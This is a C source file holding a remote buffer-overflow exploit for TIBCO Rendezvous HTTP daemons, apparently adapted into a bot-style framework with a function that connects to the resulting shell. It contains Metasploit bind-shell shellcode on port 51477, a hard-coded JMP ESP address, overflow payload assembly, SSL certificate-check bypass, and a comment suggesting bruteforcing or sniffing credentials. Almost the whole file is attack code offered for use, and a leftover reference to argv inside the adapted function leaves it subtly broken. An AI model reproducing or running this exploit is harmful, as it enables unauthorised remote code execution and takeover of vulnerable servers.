/*
#include <stdio.h>
#include <tchar.h> 
#include <winsock2.h>
#include <windows.h>
#include <Wininet.h>
*/
#include "includes.h"
#include "functions.h"
#include "externs.h"

//#pragma comment(lib, "ws2_32.lib")
//#pragma comment(lib, "wininet.lib")


struct _targets {
   char *daemon;
   char *name;
   char *version;
   char *target;
   char *header;
   char *tail;
} TARGETS[] = { //supported versions
{ "rvrd","Routing Communications Daemon","Generic win32","/add_router","router_name=","&type=+Add+Router+"},
{ "rvsrd","Routing Communications Daemon","Generic win32","/add_router","router_name=","&type=+Add+Router+"},
{ "rvsd","Secure Daemon","Generic win32","/sd_add_network_service","network=","&service=&type="},
{ "rva","Agent for Java","Generic win32","/set_main","edit_listen=7600&edit_service=","&edit_network=&edit_daemon=&submit=Submit"},
{ "rvcache","Initial Value Cache","Generic win32","/change_services","Service=&Network=&Daemon=","&request_type=Submit"},
/* more versions here.... */
};


unsigned char CALLESP[] ="\xed\x1e\x95\x7c";    //JMP ESP at ntdll.dll

typedef struct _HTTPData {
    unsigned char *buffer;
    DWORD dwReturnCode;
    DWORD dwBytesRead;
    unsigned int DataOffset;
} HTTPData, *PHTTPData;


unsigned char jmpBack []= //JMP EBP -500 without nulls
    "\x81\xec\xff\xff\xf4\x01"
    "\x81\xc4\x0b\xfe\xf4\x01"
    "\xff\xe4";


unsigned char shellcode[] =
/* win32_bind -  EXITFUNC=seh LPORT=51477 Size=346 Encoder=PexFnstenvSub http://metasploit.com */
//Restricted chars: 0x00 0x06 0x07 0x08 0x0a 0x0d 0x20 0x22 0x28 0x29 0x30 0x5c 0xcd 0xf2
"\x33\xc9\x66\x81\xe9\xb0\xff\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73"
"\x13\x90\x90\x47\x87\x83\xeb\xfc\xe2\xf4\x6c\xfa\xac\xca\x78\x69"
"\xb8\x78\x6f\xf0\xcc\xeb\xb4\xb4\xcc\xc2\xac\x1b\x3b\x82\xe8\x91"
"\xa8\x0c\xdf\x88\xcc\xd8\xb0\x91\xac\xce\x1b\xa4\xcc\x86\x7e\xa1"
"\x87\x1e\x3c\x14\x87\xf3\x97\x51\x8d\x8a\x91\x52\xac\x73\xab\xc4"
"\x63\xaf\xe5\x75\xcc\xd8\xb4\x91\xac\xe1\x1b\x9c\x0c\x0c\xcf\x8c"
"\x46\x6c\x93\xbc\xcc\x0e\xfc\xb4\x5b\xe6\x53\xa1\x9c\xe3\x1b\xd3"
"\x77\x0c\xd0\x9c\xcc\xf7\x8c\x3d\xcc\xc7\x98\xce\x2f\x09\xde\x9e"
"\xab\xd7\x6f\x46\x21\xd4\xf6\xf8\x74\xb5\xf8\xe7\x34\xb5\xcf\xc4"
"\xb8\x57\xf8\x5b\xaa\x7b\xab\xc0\xb8\x51\xcf\x19\xa2\xe1\x11\x7d"
"\x4f\x85\xc5\xfa\x45\x78\x40\xf8\x9e\x8e\x65\x3d\x10\x78\x46\xc3"
"\x14\xd4\xc3\xc3\x04\xd4\xd3\xc3\xb8\x57\xf6\xf8\x8e\x92\xf6\xc3"
"\xce\x66\x05\xf8\xe3\x9d\xe0\x57\x10\x78\x46\xfa\x57\xd6\xc5\x6f"
"\x97\xef\x34\x3d\x69\x6e\xc7\x6f\x91\xd4\xc5\x6f\x97\xef\x75\xd9"
"\xc1\xce\xc7\x6f\x91\xd7\xc4\xc4\x12\x78\x40\x03\x2f\x60\xe9\x56"
"\x3e\xd0\x6f\x46\x12\x78\x40\xf6\x2d\xe3\xf6\xf8\x24\xea\x19\x75"
"\x2d\xd7\xc9\xb9\x8b\x0e\x77\xfa\x03\x0e\x72\xa1\x87\x74\x3a\x6e"
"\x05\xaa\x6e\xd2\x6b\x14\x1d\xea\x7f\x2c\x3b\x3b\x2f\xf5\x6e\x23"
"\x51\x78\xe5\xd4\xb8\x51\xcb\xc7\x15\xd6\xc1\xc1\x2d\x86\xc1\xc1"
"\x12\xd6\x6f\x40\x2f\x2a\x49\x95\x89\xd4\x6f\x46\x2d\x78\x6f\xa7"
"\xb8\x57\x1b\xc7\xbb\x04\x54\xf4\xb8\x51\xc2\x6f\x97\xef\x60\x1a"
"\x43\xd8\xc3\x6f\x91\x78\x40\x90\x47\x87";


PHTTPData MakeHTTPRequest(char *host, DWORD port, char *metod,char *Url,int ssl, char *buffer);
int GetSSLPort(char *buffer);
void DumpMem(void* string, int length);
/******************************************************************************/
int GetSSLPort(char *buffer) {
    char *p,*q;
    p=strstr(buffer,"https://");
    if (p) {
        q=strchr(&p[8],':');
        if (q) {
         p=strchr(q,'/');
         if (p)  {
          p[0]='\0';return(atoi(q+1));
         }
        }
    }
    return(-1);
}
/******************************************************************************/
int GetTibcoDaemon(char *buffer, char *daemon) {
    char *p;
    char *q;
    char name[15];
    int i;
    static char SEPARADOR[]="color=\"#242424\">";  //"242424";

    p=strstr(buffer,SEPARADOR);
    if (p) {
        p=p+strlen(SEPARADOR)+1;
        while(p[0]==' ') p++;
        q=strchr(&p[0],'<');
        if (q) {
            q[0]='\0';
            printf("[+] Daemon Found: %s - ",p);
            strncpy(name,p,14);
            q=q+6;
            while(q[0]==' ') q++;
            p=strchr(&q[0],'<');
            if (p) {
                p[0]='\0';
                printf("version: %s\n",q);
            }
            for(i=0;i<sizeof(TARGETS)/sizeof(struct _targets);i++) {
                if (strcmp(TARGETS[i].daemon,name)==0) {
                    return(i);

                }
            }
        }
    }
    return(-1);
}

/******************************************************************************/
PHTTPData MakeHTTPRequest(char *host, DWORD port, char *metod,char *Url,int ssl, char *buffer) {
//better than playing with sockets ^^
    HINTERNET hInternetSession,hConnect,hRequest;
    static TCHAR hdrs[] = "Content-Type: application/x-www-form-urlencoded";
    int ret;
    PHTTPData resultado;
    char bufQuery[32] ;
    DWORD dwBuffLen,dwFlags;
    BOOL bQuery,bRead;
    DWORD dwHTTPCode,dwIndex,dwFileSize,dwReadedBytes,dwLengthBufQuery = sizeof(bufQuery);
    //PSTR pszUser ="Administrator"; 
    //PSTR pszPass="test";

    resultado=malloc(sizeof(HTTPData));
    memset(resultado,0,sizeof(HTTPData));

    if ((hInternetSession = InternetOpen ("TigerTeam 514",INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0)) == NULL) {
        return (resultado);
    }
    hConnect = InternetConnect(hInternetSession,host,port,NULL,NULL,INTERNET_SERVICE_HTTP,0,1);
    if (!ssl) {
        hRequest = HttpOpenRequest(hConnect,
        metod,Url,NULL,NULL,NULL,INTERNET_FLAG_RELOAD,0);
    } else {
        hRequest = HttpOpenRequest(hConnect,
            metod,Url,NULL,NULL,NULL,
            INTERNET_FLAG_IGNORE_CERT_CN_INVALID |INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID     ,0);
    }

    if (hRequest==NULL) {
        printf("error chungo en HttpOpenRequest\n");
        return(resultado);
    }

    if (buffer==NULL) {
            ret = HttpSendRequest(hRequest,hdrs,strlen(hdrs),NULL,0);
    } else {
            printf("[+] Sending Exploit ( %i bytes)\n",strlen(buffer));
            ret = HttpSendRequest(hRequest,hdrs,strlen(hdrs),buffer,strlen(buffer));

    if ((!ret) && (ssl) ){
            dwBuffLen = sizeof(dwFlags);
            printf("[+] Ignoring unknown CA...\n");
            InternetQueryOption (hRequest, INTERNET_OPTION_SECURITY_FLAGS,
                (LPVOID)&dwFlags, &dwBuffLen);
            dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
            InternetSetOption (hRequest, INTERNET_OPTION_SECURITY_FLAGS,
                &dwFlags, sizeof (dwFlags) );
/*
//authentication support here.
//If you need user & password try
//a) bruteforce
//b) sniffer
//c) local privilege scalation with TibcoPasswordExtractor.c

            InternetSetOption(hRequest, INTERNET_OPTION_USERNAME,
                          pszUser, _tcslen(pszUser) + 1);
            InternetSetOption(hRequest, INTERNET_OPTION_PASSWORD,
                          pszPass, _tcslen(pszPass) + 1);
*/
            printf("[+] Sending Exploit ( %i bytes)\n",strlen(buffer));
            ret = HttpSendRequest(hRequest,hdrs,strlen(hdrs),buffer,strlen(buffer));
        }


        if (!ret) {
            printf("Se ha enviado mal la peticion HTTP: %i\n",GetLastError());
            return(resultado);
        }
    }
        bQuery= HttpQueryInfo(hRequest,HTTP_QUERY_STATUS_CODE,bufQuery,&dwLengthBufQuery,NULL);
        if (!bQuery) {
            printf("Control de Errores - bQuery Vale NULL\n");
            return(resultado);
        }
        resultado->dwReturnCode = (DWORD)atol(bufQuery) ;
//        printf("HEADER RESPONSE: %i \n",resultado->dwReturnCode);

        dwLengthBufQuery=sizeof(bufQuery);
        bQuery= HttpQueryInfo(hRequest, //petici�n de tama�o de la petici�n.
                HTTP_QUERY_CONTENT_LENGTH,
                bufQuery,
                &dwLengthBufQuery,
                NULL);
        dwFileSize = (DWORD)atol(bufQuery) ;
//        printf("Vamos a leer %i bytes de datos\n",dwFileSize);
        resultado->dwBytesRead=dwFileSize;
        if (dwFileSize==0) {
            resultado->buffer=NULL;
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternetSession);
            return(resultado);
        }
        resultado->buffer= malloc(dwFileSize+1);
        bRead = InternetReadFile(hRequest,
                resultado->buffer,
                dwFileSize,
                &dwReadedBytes);
        resultado->buffer[resultado->dwBytesRead] = '\0' ;

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternetSession);
    return(resultado);
}
/***************************************************************************
void usage(void) {
    printf("Tibco.exe usage: -e parameters\n\n");
    printf("Tibco.exe -e host (buffer overflow)\n");
    exit(1);
}
****************************************************************************/

//int main(int argc, char* argv[])
BOOL tibco(char *target, void* conn,EXINFO exinfo)

{

 DWORD size,i,read,port=7580;
 unsigned char *buffer,datos[5000];
 HANDLE f;
 WSADATA wsaData;
 HTTPData *resultado;
 unsigned short bindport;
 signed int test;
 int dst;
 int t[0xff+1];
/*
 printf("Tibco RendezVous rvrd, rvsrd remote exploit\n");
 printf("Author: Andres Tarasco ( atarasco @ sia.es)\n");
 printf("Url: http://www.514.es\n\n");

 if  (argc==3) {
    if (argv[1][0]=='-') {
        if (argv[1][1]!='e') {
            usage();
        }
    }
 }  else {
    usage();
 }
*/
 WSAStartup(MAKEWORD(2, 2), &wsaData);
 //printf("[+] Connection to Tibco HTTP Daemon..\n");

 
 resultado= MakeHTTPRequest(exinfo.ip, exinfo.port, "GET","/ ",0, NULL);
 if (resultado->dwReturnCode!=200) {
    //printf("[-] Request Error (ErrorCode: %i)\n",resultado->dwReturnCode);
    return false;
 }
 dst=GetTibcoDaemon(resultado->buffer,NULL); //Get Version
//m/"#242424">(.*?)<br>.*?(.*?)<br>/
 if (dst==-1) {
    //printf("[-] Unknown Tibco Daemon (No donut for you)\n");
    return false;
 }

 //BLINK! BLINK! BLINK!

 resultado= MakeHTTPRequest(exinfo.ip, exinfo.port, "GET","/daemon_parameters",0, NULL);
 port=GetSSLPort(resultado->buffer);
 if (!port) {
    //printf("[-] Unable to gather SSL port\n");
    return false;
 }
 //printf("[+] Connecting to Tibco SSL Service at port %i\n",port);
 if ((dst==0) || (dst==1) ) {
    memset(datos,'\0',sizeof(datos)-1);

    memcpy(datos,TARGETS[dst].header,strlen(TARGETS[dst].header));
    memset(&datos[12],'A',498);
    memcpy(&datos[16],shellcode,sizeof(shellcode)-1);
    memcpy(&datos[12+498],CALLESP,4);
    // memcpy(&datos[12+498],"AAAA",4);
    memcpy(&datos[12+498+4],jmpBack,sizeof(jmpBack)); //Jump back ( EBP -500)
    memcpy(&datos[12+498+4+sizeof(jmpBack)-1],TARGETS[dst].tail,strlen(TARGETS[dst].tail));
 }
//    DumpMem(datos,strlen(datos));

 resultado= MakeHTTPRequest(argv[2], port, "POST","/add_router",1, datos);
 if (resultado->dwReturnCode==200) {
    printf("[+] Exploit succesfully sent. Now telnet to port 51477\n");
	
	if (connectshell(exinfo,51477)) {

		return true;
	}
		return false;
    //printf("resultado: %i\n",resultado->dwReturnCode);
    //printf("resultado: %i\n",resultado->dwBytesRead);
    //printf("datos: %s\n",resultado->buffer);
    //DumpMem(resultado->buffer+300,strlen(resultado->buffer)-300);

 } else {
    return false;
    //printf("resultado: %i\n",resultado->dwBytesRead);
    //printf("datos: %s\n",resultado->buffer);

 }
 return false;
}